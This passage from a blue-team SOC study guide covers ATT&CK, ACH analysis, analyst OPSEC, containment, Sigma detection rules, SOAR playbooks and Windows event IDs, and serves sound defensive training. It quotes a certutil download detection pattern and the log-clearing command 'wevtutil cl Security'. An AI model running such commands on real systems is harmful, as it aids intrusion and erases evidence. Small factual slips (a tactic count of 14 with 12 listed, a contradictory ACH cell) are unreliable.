  - **Tactics (The "Why"):** The adversary's tactical goal (14 enterprise tactics: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact).
  - **Techniques (The "How"):** The specific method used to achieve the tactical goal (e.g., T1059 Command and Scripting Interpreter).
  - **Sub-Techniques:** Detailed granular variations (e.g., T1059.001 PowerShell).
  - **Procedures:** The exact command or software implementation used by a specific threat group.
- **Blue Team Application:** Mapping detection coverage, identifying telemetry blind spots, and validating defenses with Atomic Red Team testing.

![MITRE ATT&CK Enterprise matrix: tactics and techniques](/images/cheatSheets/sec450/book4-p67-models-concepts-1.png)

*MITRE ATT&CK Enterprise matrix: tactics and techniques*

---

#### 4. The F3EAD Targeting Cycle

An intelligence-driven military targeting framework adapted for advanced incident response:

- **Find:** Identify adversary presence through SIEM alerts, EDR detections, or threat hunting.
- **Fix:** Pinpoint and isolate the adversary's exact location, infrastructure, and active accounts.
- **Finish:** Neutralize the threat through technical containment and credential revocation.
- **Exploit:** Extract intelligence from captured artifacts (malware samples, memory dumps, C2 logs).
- **Analyze:** Correlate extracted IOCs and TTPs against global threat intelligence databases.
- **Disseminate:** Share actionable intelligence with the broader security team, management, and ISAC communities.

---

### Module 4.4 — Structured Analytical Techniques & ACH

#### 1. Analysis of Competing Hypotheses (ACH)

Developed by CIA analyst Richards Heuer, ACH is an 8-step methodology designed to overcome human cognitive bias during complex, ambiguous investigations:

- **Step 1: Identify Hypotheses:** Brainstorm all mutually exclusive, plausible explanations for the observed event.
- **Step 2: List Evidence & Arguments:** Document all relevant log entries, network connections, user reports, and technical artifacts.
- **Step 3: Construct Diagnostic Matrix:** Plot hypotheses across the top columns and evidence items along the vertical rows.
- **Step 4: Analyze Evidence Consistency:** Evaluate whether each piece of evidence is Consistent (`+`), Inconsistent (`-`), or Not Applicable (`N/A`) with each hypothesis.
- **Step 5: Eliminate Non-Diagnostic Evidence:** Evidence that is consistent with *all* hypotheses has zero diagnostic value and must be removed!
- **Step 6: Focus on Disproving Hypotheses:** **The Core Principle:** Confirmation bias causes humans to look for supporting evidence. ACH forces analysts to look for *disproving* evidence. **The hypothesis with the least contradictory evidence is the most likely truth.**
- **Step 7: Analyze Sensitivity:** Identify which specific evidence items, if found to be false or manipulated by the attacker, would overturn the conclusion.
- **Step 8: Document Conclusions & Alternatives:** Present the primary finding along with alternative hypotheses and confidence levels.

---

#### 2. Example ACH Diagnostic Matrix in Incident Triage

Scenario: High-privilege account `admin_smith` logs on at 2:00 AM from an external Ukrainian IP address.

| Evidence Item | H1: Legitimate Admin on Vacation | H2: Authorized Pentester | H3: Credential Theft / Breach | Diagnostic Value |
|---------------|----------------------------------|--------------------------|--------------------------------|------------------|
| **E1:** Logon from Ukrainian IP | Consistent (`+`) | Consistent (`+`) | Consistent (`+`) | **Low (Non-diagnostic)** |
| **E2:** MFA push accepted instantly | Consistent (`+`) | Consistent (`+`) | Inconsistent (`-`) (Unless MFA fatigue) | High |
| **E3:** No pentest scheduled this month | Consistent (`+`) | **Inconsistent (`-`)** | Consistent (`+`) | High |
| **E4:** Admin Smith's badge swiped at office at 8:00 AM | **Inconsistent (`-`)** | Consistent (`+`) | Consistent (`+`) | **High (Disproves H1!)** |
| **Conclusion** | **Eliminated (Contradicted by E4)** | **Eliminated (Contradicted by E3)** | **Most Likely Truth (H3: Credential Compromise)** | Escalate to incident! |

![ACH matrix: evidence rows scored against hypotheses H1-H4 as consistent, inconsistent, or neutral](/images/cheatSheets/sec450/book4-p90-structured-analysis-1.jpeg)

*ACH matrix: evidence rows scored against hypotheses H1-H4 as consistent, inconsistent, or neutral*

---

#### 3. The Medical Doctor Analogy

A seasoned security analyst approaches investigations like a skilled physician:

- **Symptoms vs Illness:** A high CPU alert or a quarantined file is merely a symptom (like a fever). Isolating the file without finding the persistence mechanism is treating the symptom while the infection kills the patient.
- **Differential Diagnosis:** Systematically ruling out alternative benign explanations before administering high-impact remedies (e.g., isolating core business servers).

---

### Module 4.5 — Analysis Questions and Analyst OPSEC

#### 1. The 6 Core Investigative Questions

Every security investigation must answer six fundamental journalistic questions:

- **WHO:** Which user account, service account, or threat actor group is responsible? What is the user's role and business clearance?
- **WHAT:** What exact commands were executed? What files were created, modified, or exfiltrated? What applications were exploited?
- **WHERE:** Which endpoints, IP addresses, subnets, and cloud resources were affected? What was the entry point (Patient Zero)?
- **WHEN:** What is the precise chronological timeline? When did initial access occur, and what was the adversary dwell time?
- **WHY:** What was the adversary's objective? Financial theft, ransomware extortion, intellectual property espionage, or disruption?
- **HOW:** How did the attacker bypass perimeter controls? Exploit CVE, phishing macro, stolen valid credentials, or supply chain compromise?

---

#### 2. Investigative Pivoting Strategies

Pivoting allows analysts to expand an investigation from a single technical breadcrumb:

- **Pivoting on IP Address:**
  - Query **Reverse DNS (PTR):** Identifies hosting provider or ISP.
  - Query **Autonomous System Number (ASN):** Differentiates residential broadband (Comcast/Verizon) from bulletproof hosting (OVH/DigitalOcean).
  - Query **Passive DNS (pDNS):** Reveals all domains that have pointed to this IP historically.
- **Pivoting on Domain Name:**
  - Query **WHOIS:** Registrar, creation date (newly registered domains < 30 days old are high risk!), registrant email.
  - Query **SSL/TLS Certificates (Censys/Crt.sh):** Reveals Subject Alternative Names (SANs) and shared certificates across attacker infrastructure.
- **Pivoting on File Hash:**
  - Query **VirusTotal / Hybrid Analysis:** Compilation timestamp, import hash (IMPHASH), behavioral process execution trees, embedded network C2 IPs.

![Link analysis graph connecting a sender address, URLs, exploit and C2 domains, IP addresses, users, and workstations](/images/cheatSheets/sec450/book4-p93-structured-analysis-1.jpeg)

*Link analysis graph connecting a sender address, URLs, exploit and C2 domains, IP addresses, users, and workstations*

![Phishing URL where a trusted brand name appears as a subdomain of an unrelated domain](/images/cheatSheets/sec450/book4-p115-analysis-questions-1.png)

*Phishing URL where a trusted brand name appears as a subdomain of an unrelated domain*

![Captured POST request submitting harvested credentials to a phishing site](/images/cheatSheets/sec450/book4-p121-analysis-questions-3.png)

*Captured POST request submitting harvested credentials to a phishing site*

---

#### 3. Operational Security (OPSEC) for Blue Team Analysts

Careless investigative actions can tip off the adversary and compromise operational confidentiality:

- **Active Probing Risks:** Never use `curl`, `nmap`, or a web browser from your corporate corporate network to connect to an attacker's C2 server! The attacker will inspect their web logs, identify your corporate IP, realize they have been detected, and immediately purge evidence or accelerate ransomware deployment.
- **Public VirusTotal Submission Risks:** Never submit suspicious proprietary documents (e.g., `Executive_Merger_Agreement.doc`) to public VirusTotal! Files submitted to VirusTotal are downloadable by all premium subscribers, exposing confidential organizational data to competitors and adversaries alike.
- **Safe OPSEC Best Practices:**
  - Search by file hash only (never upload the raw file).
  - Use dedicated, non-attributable external VPNs/proxies or Tor for OSINT research.
  - Perform all active testing inside isolated sandbox virtual machines.

![VirusTotal: scanning a file or URL versus searching existing results](/images/cheatSheets/sec450/book4-p134-analysis-opsec-1.png)

*VirusTotal: scanning a file or URL versus searching existing results*

![urlscan.io: scanning a URL versus searching existing scans](/images/cheatSheets/sec450/book4-p134-analysis-opsec-3.jpeg)

*urlscan.io: scanning a URL versus searching existing scans*

---

### Module 4.6 — Intrusion Discovery and Response Initiation

#### 1. Determining the Blast Radius & Scope

An incomplete investigation leads to re-infection; the security team must identify the full operational boundary of the intrusion:

- **Patient Zero Identification:** The initial host and entry vector where the attacker first breached the environment.
- **Dwell Time Calculation:** The time elapsed between initial compromise and blue team discovery:
  $$\text{Dwell Time} = \text{Detection Timestamp} - \text{Initial Compromise Timestamp}$$
- **Lateral Spread Scoping:** Tracking all hosts accessed by compromised credentials using Windows Event 4624 (Logon Type 3) and Sysmon Event 3 network connections.

---

#### 2. The Containment Timing Dilemma

Deciding *when* to execute containment is one of the hardest strategic decisions in security operations:

| Containment Strategy | Advantages | Severe Risks | Recommended Context |
|----------------------|------------|--------------|---------------------|
| **Immediate Containment ("Whack-a-Mole")** | Immediately stops data exfiltration; halts active ransomware encryption. | Alerts the attacker! Attacker activates secondary backdoors, deploys wipers, or changes C2 infrastructure before full scoping is complete. | Active ransomware outbreak; confirmed ongoing massive exfiltration of crown-jewel data. |
| **Delayed Containment ("Coordinated Strike")** | Allows blue team to silently monitor adversary actions, identify all infected hosts, capture volatile memory, and map complete C2 network. | Attacker may achieve objective or notice monitoring and accelerate destruction while defenders watch. | Advanced Persistent Threat (APT) espionage; multi-host stealthy footholds. |

![Common missteps: mitigating too early, touching adversary infrastructure, and preemptively blocking adversary infrastructure](/images/cheatSheets/sec450/book4-p156-intrusion-discovery-1.png)

*Common missteps: mitigating too early, touching adversary infrastructure, and preemptively blocking adversary infrastructure*

![Common missteps: preemptive password resets and failing to preserve or collect critical log data](/images/cheatSheets/sec450/book4-p156-intrusion-discovery-2.png)

*Common missteps: preemptive password resets and failing to preserve or collect critical log data*

---

#### 3. Coordinated Containment Execution

When containment is triggered, all vectors must be severed simultaneously:

- **Host Isolation:** Isolate all compromised endpoints via EDR API simultaneously.
- **Network Severance:** Block C2 domains and IPs on all perimeter firewalls and web proxies.
- **Credential Revocation:** Reset passwords for all compromised users and revoke Active Directory Kerberos Ticket Granting Tickets (`KRBTGT` password reset performed twice!).

---

### Module 4.7 — Incident Closing, Metrics, and Quality Assurance

#### 1. Incident Closure Requirements

An incident cannot be marked resolved without exhaustive post-incident documentation:

- **Executive Summary:** High-level non-technical summary explaining business impact, data exposure, root cause, and executive remediation actions.
- **Technical Timeline:** Chronological step-by-step breakdown of every attacker action and defensive countermeasure.
- **Definitive IOC Catalog:** All identified hashes, C2 IPs, domains, and malicious accounts stored in MISP / threat intel database.
- **Remediation Verification:** Cryptographic and log-based verification that malware, backdoors, and compromised credentials have been 100% eradicated.

---

#### 2. SOC Quality Assurance (QA) & Peer Review

Consistent analytical excellence requires continuous institutional auditing:

- **Peer Review Audits:** Senior analysts sample and review 5%–10% of closed Tier 1/2 tickets weekly.
- **Evaluation Criteria:**
  - Was the disposition (TP/FP) mathematically and forensically justified?
  - Were all required investigative steps in the playbook followed?
  - Were case notes clear, unambiguous, and reproducible?
- **Feedback Loops:** Constructive feedback shared during team standups to elevate collective tradecraft.

---

#### 3. The Blameless Post-Mortem

Incident post-mortems must focus on systemic engineering improvements rather than individual blame:

- **Core Principle:** Humans will make mistakes. Resilient organizations build engineering guardrails that prevent a single human error from causing catastrophic failure.
- **Actionable Outputs:** Every post-mortem must result in concrete Jira/DevOps engineering tasks:
  - New detection rules created for missed attacker techniques.
  - Gaps in logging telemetry patched.
  - Architecture policies updated (e.g., enforcing MFA on previously exempt service accounts).

---

## Book 5 — Continuous Improvement, Analytics, and Automation

> **SEC 450.5 — Continuous Improvement, Analytics, and Automation**

### Module 5.1 — Improving Life in the SOC & Burnout Prevention

#### 1. The Human Challenge of Security Operations

Analyst turnover and burnout represent the single largest operational threat to SOC efficacy:

- **Primary Causes of Burnout:**
  - High alert volume dominated by False Positives (alert fatigue).
  - Repetitive, robotic triage tasks with zero intellectual challenge.
  - High stress paired with zero operational agency or authority.
  - Disruptive 24/7 rotating night shift schedules that damage circadian biology.
  - Lack of clear career progression or technical mentorship.

---

#### 2. Ergonomic Shift Scheduling Models

Designing human-centric shift rotations mitigates psychological exhaustion:

| Shift Schedule | Pattern Structure | Advantages | Operational Challenges |
|----------------|-------------------|------------|------------------------|
| **Panama / 2-2-3 Model** | 12-hour shifts; 2 on, 2 off, 3 on, 2 off, 2 on, 3 off. Every other weekend off. | 3-day weekends every other week; 182 workdays per year. | 12-hour shifts cause cognitive fatigue towards hours 10–12. |
| **Dupont Model** | 12-hour shifts; 4 night shifts, 3 days off, 3 day shifts, 1 day off, 3 night shifts, 3 days off, 4 day shifts, 7 consecutive days off! | 7 consecutive days off every 4-week cycle provides deep recovery. | Night-to-day transitions are severe on sleep quality. |
| **Follow-the-Sun** | Global SOCs with 3 regional hubs (Americas, EMEA, APAC). Each team works standard 8-hour day shifts. | **Completely eliminates night shifts!** Highest analyst retention and alertness. | Requires multinational presence, shared language, and seamless shift handover tooling. |

---

#### 3. Tierless SOCs & Innovation Time

Transforming SOC culture from a factory assembly line into an engineering team:

- **Tierless Rotation Model:** Instead of trapping junior analysts in Tier 1 triage indefinitely, all analysts rotate weekly through distinct operational roles:
  - *Week 1:* Real-time queue triage and initial containment.
  - *Week 2:* Deep incident investigation and forensic escalation.
  - *Week 3:* Proactive threat hunting and detection engineering.
  - *Week 4:* Project work, automation scripting, and lab training.
- **20% Project Time:** Dedicating 1 day per week (or 20% of shift time) for analysts to build Python automations, write Sigma detection rules, and research emerging CVEs.

---

### Module 5.2 — Analytic Features and Contextual Log Enrichment

#### 1. The Value of Log Enrichment at Ingestion Time

Raw security logs are sparse; contextual enrichment transforms ambiguous strings into actionable intelligence before an analyst opens the alert:

- **Ingestion-Time vs Query-Time Enrichment:**
  - *Query-Time:* Looking up external data during search queries. Slow, resource-intensive, and fails if historical context changes.
  - *Ingestion-Time:* Decorating logs with metadata dynamically as Logstash or Filebeat processes the event. Blazing fast at search time and preserves historical truth at the moment the event occurred.

---

#### 2. Core Log Enrichment Data Sources

Essential contextual metadata added to security events:

| Enrichment Type | Data Source | Injected Metadata Fields | Blue Team Operational Benefit |
|-----------------|-------------|--------------------------|-------------------------------|
| **GeoIP & ASN** | MaxMind GeoLite, Team Cymru | `source.geo.country_name`, `source.as.organization.name` | Instantly highlights impossible travel and connections to high-risk foreign ASNs. |
| **CMDB / Asset DB** | Internal Asset Database | `host.owner`, `host.department`, `host.criticality_tier`, `host.environment` | Differentiates an attack on an intern's test VM from an attack on an executive production database. |
| **Active Directory** | LDAP / Active Directory | `user.title`, `user.department`, `user.manager`, `user.is_privileged` | Flags privilege anomalies (e.g., marketing user running domain administrative commands). |
| **Threat Intel** | MISP, VirusTotal, AlienVault | `threat.indicator.confidence`, `threat.feed.name`, `threat.actor` | Automatically tags known adversary C2 IPs and file hashes on the wire. |

![Logstash filter plugins available for enrichment (cidr, dns, geoip, grok, http, translate, useragent, and others)](/images/cheatSheets/sec450/book5-p46-analytic-enrichment-2.jpeg)

*Logstash filter plugins available for enrichment (cidr, dns, geoip, grok, http, translate, useragent, and others)*

![Splunk lookups: lookup table files, lookup definitions, and automatic lookups](/images/cheatSheets/sec450/book5-p46-analytic-enrichment-1.png)

*Splunk lookups: lookup table files, lookup definitions, and automatic lookups*

---

#### 3. Behavioral Baselining & Statistical Profiling

Moving beyond static string signatures to statistical anomaly detection:

- **User and Entity Behavior Analytics (UEBA):**
  - Tracking historical moving averages: *"How many megabytes of data does Alice normally upload to external servers on a Tuesday?"*
  - Flagging deviations exceeding 3 standard deviations ($3\sigma$) above baseline as potential data exfiltration.
- **Peer Group Analysis:** Comparing an employee's activity against peers in the same Active Directory department.

---

### Module 5.3 — Analytic Design, Testing, and Sharing

#### 1. The Detection Engineering Lifecycle

Detection engineering is an iterative software engineering discipline:

```
[Threat Hypothesis] -> [Telemetry Audit] -> [Rule Drafting] -> [Atomic Red Team Test] -> [Tuning & Staging] -> [Production Deployment]
```

1. **Threat Hypothesis:** Identify an adversary technique (e.g., MITRE ATT&CK T1003.001 LSASS memory dumping).
2. **Telemetry Audit:** Verify the required log sources are actively collected (Sysmon Event 10 or Windows Security Event 4656).
3. **Logic Drafting:** Write detection query with precise field boundaries and filter out known business noise.
4. **Unit Testing:** Execute atomic simulations (Red Canary Atomic Red Team) in a test environment to validate the rule triggers.
5. **Staging / Canary Phase:** Deploy in staging for 7–14 days in *silent mode* to measure alert volume and true/false positive ratios.
6. **Production Deployment:** Move to active production queue; link to comprehensive triage playbook.

---

#### 2. The Sigma Standard for Generic Detection Rules

Sigma is the open, vendor-agnostic signature format for security event logs:

- **Core Advantage:** Write once, convert to any SIEM query (Elasticsearch, Splunk, Microsoft Sentinel, QRadar) using `sigmac` / `sigma-cli`.
- **Standard Sigma YAML Schema:**

```yaml
title: Suspicious Certutil File Download
id: e71c890a-200d-4f1e-9276-8049a4f48825
status: production
description: Detects the use of certutil.exe to download files from external web servers
references:
    - https://attack.mitre.org/techniques/T1105/
author: SANS SEC450
date: 2026-10-15
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-split'
    condition: selection
falsepositives:
    - Legitimate enterprise certificate renewal scripts
level: high
tags:
    - attack.ingress_tool_transfer
    - attack.t1105
```

![Sigma rule with multiple named selections combined by the condition '1 of them'](/images/cheatSheets/sec450/book5-p76-analytic-design-1.png)

*Sigma rule with multiple named selections combined by the condition '1 of them'*

![Sigma rule with a selection and a filter combined as 'selection and not filter'](/images/cheatSheets/sec450/book5-p76-analytic-design-2.png)

*Sigma rule with a selection and a filter combined as 'selection and not filter'*

---

#### 3. MITRE D3FEND & DeTT&CT

Next-generation defensive engineering frameworks:

- **MITRE D3FEND:** A knowledge graph of defensive cybersecurity techniques counter-mapped to ATT&CK:
  - *Model* (System Mapping)
  - *Detect* (File Analysis, Network Traffic Analysis, Process Spawning Analysis)
  - *Isolate* (Execution Isolation, Network Isolation)
  - *Deceive* (Decoy Environment, Honeypots)
  - *Evict* (Process Termination, Credential Revocation)
- **DeTT&CT:** Framework allowing blue teams to map their exact detection coverage, data source visibility, and testing maturity against ATT&CK matrices.

---

### Module 5.4 — Alert Tuning and False Positive Reduction

#### 1. The Alert Tuning Lifecycle

Continuous tuning is mandatory to protect analyst cognitive bandwidth:

- **The Tuning Metric:** Any detection rule generating > **30% False Positives** is defective and must be immediately placed back into staging for re-engineering or deprecation.
- **The Tuning Process:**
  1. Review weekly top-10 highest volume alerts.
  2. Aggregate false positive tickets to identify recurring benign patterns (e.g., vulnerability scanners, software deployment agents).
  3. Determine root cause: Was the signature too generic? Did it lack parent process context?
  4. Refine filter logic without creating dangerous blind spots.

![Alert signatures ranked by count to identify the noisiest candidates for tuning](/images/cheatSheets/sec450/book5-p97-tuning-false-positives-1.png)

*Alert signatures ranked by count to identify the noisiest candidates for tuning*

![Alert counts by source IP address showing one dominant source](/images/cheatSheets/sec450/book5-p99-tuning-false-positives-2.jpeg)

*Alert counts by source IP address showing one dominant source*

![Alert counts by source country](/images/cheatSheets/sec450/book5-p99-tuning-false-positives-3.jpeg)

*Alert counts by source country*

---

#### 2. Whitelisting Best Practices: Specificity Over Broad Wildcards

Careless whitelisting creates blind spots that attackers actively exploit:

- **DANGEROUS Whitelist:** `CommandLine contains "powershell.exe"` or `FolderPath contains "C:\Temp\*"`. (Attackers simply drop malware into `C:\Temp` to evade detection!).
- **SECURE Multi-Factor Whitelist:** Combine at least 3–4 immutable parameters:
  - Exact Process Path: `C:\Program Files\Acme Backup\agent.exe`
  - Parent Process Name: `C:\Windows\System32\services.exe`
  - Command Line Arguments: Exact specific script path without wildcards
  - File Digital Signer: `CN="Acme Corporation", O="Acme Corp"`
  - Cryptographic Hash: SHA-256 hash of the authorized binary

---

#### 3. Signature Deprecation Lifecycle

Rules cannot remain in production forever:

- **Technical Debt:** Legacy rules designed for software decommissioned 5 years ago consume SIEM processing cycles and cause confusing false alarms.
- **Annual Rule Audit:** Review all detection rules with zero hits over the preceding 12 months. Validate whether the threat vector is still relevant; if the underlying asset or protocol has been decommissioned, formally deprecate and archive the rule.

---

### Module 5.5 — Security Automation and Orchestration (SOAR)

#### 1. When to Automate — The Automation Decision Matrix

Automation must be deployed strategically to assist analysts, not replace critical thinking:

| Operational Task | Automation Candidacy | Rationale & Safety Considerations |
|------------------|----------------------|-----------------------------------|
| **Observable Reputation Lookups** | **100% Automated** | Zero risk. Querying VirusTotal, Shodan, and internal CMDB for every alert saves 5–10 minutes per ticket. |
| **Phishing Email Header Parsing** | **100% Automated** | Standardized logic. Extracts headers, SPF/DKIM status, and attachment hashes into case instantly. |
| **User Verification Prompts** | **Automated** | Slack/Teams bot messages user: *"Did you just log in from France?"* Suspends account if user clicks *"No"*. |
| **Endpoint Network Isolation** | **Human-in-the-Loop** | High impact. Automated for confirmed commodity malware; requires analyst confirmation for servers. |
| **Active Directory Account Deletion**| **STRICTLY MANUAL** | Catastrophic blast radius if fired incorrectly against service accounts or domain controllers. |

---

#### 2. Anatomy of a SOAR Playbook

A structured SOAR workflow follows a robust conditional logic pipeline:

1. **Trigger:** Alert ingested via SIEM webhook (e.g., *"Suspicious Outbound Connection"*).
2. **Data Extraction:** Parses destination IP, source endpoint hostname, and executing process ID.
3. **Automated Enrichment:**
   - Queries Threat Intel API for destination IP reputation.
   - Queries CMDB API for endpoint criticality score.
   - Queries EDR API to pull process execution lineage and file SHA-256.
4. **Conditional Decision Branch:**
   - *If Threat Score < 50 AND Asset Criticality = Low:* Post summary note to ticket; leave open for Tier 1 review.
   - *If Threat Score >= 80 AND Known C2 Family:* Initiate automated containment branch!
5. **Interactive Gate / Action:** Prompt on-call analyst: `[Confirm Host Network Isolation?]`. Upon click, EDR API isolates machine within 2 seconds.

![Analyst input forms for automated response actions: add a network block and grab a file sample](/images/cheatSheets/sec450/book5-p117-automation-orchestration-2.jpeg)

*Analyst input forms for automated response actions: add a network block and grab a file sample*

---

### Module 5.6 — Improving Operational Efficiency

#### 1. Metrics That Drive True Defensive Posture

Measuring the wrong metrics incentivizes destructive behavior (e.g., judging analysts by "tickets closed per hour" leads to rushed, sloppy investigations):

- **Mean Time to Detect (MTTD):** The duration between initial adversary access and the first alert generated by security systems.
- **Mean Time to Acknowledge (MTTA):** The duration an alert sits in the queue before an analyst opens it and begins triage.
- **Mean Time to Remediate / Contain (MTTR):** The duration between alert acknowledgment and the complete neutralization of the threat.
- **Dwell Time:** The total time an adversary maintains unauthorized access within the network before being completely ejected.
- **False Positive Ratio:** Percentage of total alerts classified as false alarms ($FP / Total$). A rising ratio indicates deteriorating detection health.

---

#### 2. Shift Handover Standards & Continuity

Information lost during shift changes is a primary cause of extended adversary dwell times:

- **Structured Handover Checklist:**
  - Active high-severity (P1/P2) incidents and their current containment status.
  - Ongoing threat hunts or anomalous activities requiring continued observation.
  - Degraded security infrastructure (e.g., log forwarding agent down on specific subnet).
  - External threat intelligence alerts (e.g., active zero-day exploitation reported by CISA).
- **Face-to-Face / Video Handover:** Outgoing and incoming shift leads must conduct an interactive 15-minute briefing; never rely solely on chat messages or email notes.

---

#### 3. Analyst Efficiency Tooling

Small tooling changes remove repetitive work from each investigation:

- **Pre-built incident forms:** Standard fields (title, description, incident type, severity, priority, kill chain stage, username, time, date) can be filled automatically from saved profiles.

![Blank incident form fields: title, description, type, severity, priority, kill chain stage, username, time, and date](/images/cheatSheets/sec450/book5-p125-operational-efficiency-1.png)

*Blank incident form fields: title, description, type, severity, priority, kill chain stage, username, time, and date*

![The same form filled automatically for a phishing report](/images/cheatSheets/sec450/book5-p126-operational-efficiency-4.png)

*The same form filled automatically for a phishing report*

![Form-filler extension menu with saved profiles such as Phishing Incident and C2 Found](/images/cheatSheets/sec450/book5-p126-operational-efficiency-2.jpeg)

*Form-filler extension menu with saved profiles such as Phishing Incident and C2 Found*

- **Response templates:** Pre-written messages for common requests, such as asking for a host to be re-imaged, leave only the hostname to complete.

![Pre-written email template requesting a re-image, with a placeholder for the hostname](/images/cheatSheets/sec450/book5-p127-operational-efficiency-2.png)

*Pre-written email template requesting a re-image, with a placeholder for the hostname*

- **Custom search keywords:** A short browser keyword can open a threat-intelligence lookup directly for a selected domain, IP, or hash.

![Custom browser search engine: keyword 'vt' mapped to a VirusTotal domain URL](/images/cheatSheets/sec450/book5-p129-operational-efficiency-1.png)

*Custom browser search engine: keyword 'vt' mapped to a VirusTotal domain URL*

- **Context-menu lookups:** A single right-click menu can send an indicator to many lookup services.

![Configured list of lookup links with display labels and URL templates](/images/cheatSheets/sec450/book5-p130-operational-efficiency-1.png)

*Configured list of lookup links with display labels and URL templates*

![Context-menu 'Threat Analytics Search' with IP, domain, and hash lookups](/images/cheatSheets/sec450/book5-p130-operational-efficiency-2.jpeg)

*Context-menu 'Threat Analytics Search' with IP, domain, and hash lookups*

---

### Module 5.7 — Containing Identified Intrusions

#### 1. The Three Pillars of Technical Containment

Effective containment requires simultaneous execution across three independent operational planes:

```
                                [ COINCIDENT CONTAINMENT ]
                               /            |             \
                              /             |              \
               [ HOST CONTAINMENT ]  [ NETWORK CONTAINMENT ]  [ IDENTITY CONTAINMENT ]
```

1. **Host-Level Containment:**
   - **EDR Network Isolation:** Cuts all network communication except the secure TLS tunnel back to the EDR management console.
   - **Process Termination:** Terminating active malicious processes and suspended parent shells.
   - **Memory Preservation:** Capturing a full volatile RAM dump (`winpmem`, `DumpIt`) *before* rebooting or shutting down the system.
2. **Network-Level Containment:**
   - **Perimeter Firewall Blocks:** Injecting attacker C2 IP addresses into border firewall drop lists.
   - **DNS Sinkholing:** Configuring enterprise DNS servers to resolve malicious C2 domains to an internal loopback address (`127.0.0.1`) or a controlled sinkhole listener.
   - **VLAN Quarantine:** Reassigning switch ports to an isolated quarantine VLAN with zero access to corporate assets or the Internet.
3. **Identity & Account Containment:**
   - **Active Directory Account Disabling:** Disabling compromised user and service accounts.
   - **Active Session Revocation:** Terminating active VPN tunnels, invalidating cloud OAuth refresh tokens, and resetting MFA tokens.
   - **Kerberos Ticket Purging:** Forcing `KRBTGT` password resets (twice within 24 hours to invalidate all existing Golden Tickets).

---

#### 2. Eradication & Recovery Verification

Never return a system to production without definitive proof of cleanliness:

- **The Golden Rule of Recovery:** Re-imaging from a known-good master image or deploying a fresh infrastructure-as-code instance is **always preferred over manual cleanup**. Attackers frequently leave hidden secondary backdoors that evade static scanners.
- **Root Cause Remediation:** Prior to putting the re-imaged system online, the original vulnerability used for initial entry (unpatched service, weak credential, missing MFA) must be definitively resolved.

---

### Module 5.8 — Skill & Career Development

#### 1. Career Trajectories in Blue Team Operations

Security operations offers a diverse, progressive technical career pathway:

- **Tier 1 Alert Analyst:** Mastering alert triage, initial log analysis, basic protocol decoding, and playbook execution.
- **Tier 2 Incident Responder:** Leading multi-stage investigations, memory analysis, disk forensics, malware triage, and root cause scoping.
- **Tier 3 Threat Hunter / SME:** Developing threat models, executing hypothesis-driven proactive hunts, and identifying advanced stealth footholds.
- **Detection Engineer:** Designing and automating new analytics, authoring Sigma rules, and managing SIEM/SOAR infrastructure.
- **SOC Architect / Lead:** Setting strategic vision, managing vendor relationships, defining risk metrics, and mentoring junior analysts.

---

#### 2. Building an Elite Home Lab

Hands-on experimentation is the fastest catalyst for technical mastery:

- **Virtualization Hypervisor:** Proxmox VE, VMware ESXi, or Type-2 hypervisors (VirtualBox, VMware Workstation).
- **Core Blue Team Stack to Deploy:**
  - *Firewall / Router:* pfSense or OPNsense (configured with multi-VLAN isolation).
  - *Network Sensor:* Zeek and Suricata running on a dedicated SPAN interface.
  - *Central SIEM:* Elastic Security (ELK) or Splunk Free Enterprise.
  - *Active Directory Domain:* Windows Server 2022 domain controller with Windows 10/11 client workstations.
  - *Host Telemetry:* Deploy Sysmon with SwiftOnSecurity or Olaf Hartong configuration; forward logs via Winlogbeat.
  - *Adversary Simulation:* Run Atomic Red Team scripts to see firsthand what attacks look like in your logs!

---

#### 3. Hands-On CTF Competitions & Continuous Learning

Sharpening diagnostic reflexes in gamified, real-world breach environments:

- **Boss of the SOC (BOTS):** Splunk's premier investigative CTF simulating massive real-world multi-stage corporate intrusions.
- **SANS Holiday Hack Challenge (KringleCon):** Free annual cybersecurity conference and CTF featuring rich defensive and offensive puzzles.
- **CyberDefenders / Hack The Box (Sherlocks):** Blue-team-focused forensic challenges providing raw PCAPs, memory dumps, and disk images.

---

## Appendix — Quick Reference Tables

### Quick Reference Tables

#### 1. Windows Security Event IDs Master Reference

| Event ID | Log Name | Event Description | Blue Team Operational Analysis Significance |
|:--------:|:--------:|:------------------|:--------------------------------------------|
| **4624** | Security | Successful Account Logon | Check **Logon Type** (Type 2=Console, 3=Network, 10=RDP), Source IP, Target User. |
| **4625** | Security | Failed Account Logon | Check Status/Substatus (0xC000006A=Bad Password, 0xC0000064=No such user). |
| **4634** | Security | Account Logoff | Marks session termination. Used with 4624 to calculate exact session duration. |
| **4648** | Security | Logon with Explicit Credentials | User executed `runas /user:...` or tools using explicit credentials. |
| **4672** | Security | Special Privileges Assigned | Administrator or elevated account logged on (SeDebugPrivilege, SeTcbPrivilege). |
| **4688** | Security | Process Creation | **Highest fidelity host event!** Shows Parent Process, New Process, and Command Line. |
| **4689** | Security | Process Termination | Process exited or was killed. |
| **4697** | Security | Service Installed | A new service was created (e.g., PsExec `PSEXESVC`, backdoor persistence). |
| **4698** | Security | Scheduled Task Created | Persistence established via Task Scheduler (`schtasks.exe`). |
| **4720** | Security | User Account Created | Unauthorized account creation; potential attacker backdoor account. |
| **4726** | Security | User Account Deleted | Attacker cleaning up temporary staging accounts. |
| **4728** | Security | Member Added to Global Group | Sensitive! User added to `Domain Admins` or privileged security group. |
| **4732** | Security | Member Added to Local Group | User added to local `Administrators` or `Remote Desktop Users` group. |
| **4738** | Security | User Account Modified | Password reset, account flags altered (e.g., DONT_REQ_PREAUTH set). |
| **4740** | Security | Account Locked Out | Multiple failed attempts exceeded threshold. Check Caller Computer Name. |
| **4756** | Security | Member Added to Universal Group | User added to `Enterprise Admins` or `Schema Admins`. |
| **4776** | Security | NTLM Authentication (DC) | Domain Controller validated NTLM credentials. |
| **7045** | System | Service Creation | System log version of 4697; logs Service Name, Service File Name, Account. |
| **1102** | Security | Security Audit Log Cleared | Catastrophic indicator! Attacker cleared event log (`wevtutil cl Security`). |
| **104**  | System | System Log Cleared | System log was cleared. |
| **4104** | PowerShell | Script Block Logging | Full plain-text script contents captured immediately prior to execution! |

---

#### 2. Windows Logon Types Quick Reference

| Logon Type | Name | Description & Investigation Context |
|:----------:|:-----|:------------------------------------|
